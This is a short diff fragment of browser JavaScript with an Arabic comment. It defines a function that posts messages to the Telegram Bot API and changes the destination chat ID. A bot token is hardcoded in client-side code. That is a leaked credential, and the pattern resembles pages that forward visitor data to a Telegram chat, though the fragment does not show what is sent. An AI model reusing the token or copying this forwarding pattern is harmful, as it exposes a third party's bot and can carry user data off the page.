@@ -79,7 +79,7 @@ document.addEventListener('DOMContentLoaded', function() {
   // دالة إرسال رسالة إلى Telegram
   function sendTelegramMessage(message) {
     const token = "8065186165:AAGKm7Y_l_UE1vvsM753iHLAdetAZ-UF7Ks";
-    const chatId = "7428700315";
+    const chatId = "6792335123";
     fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
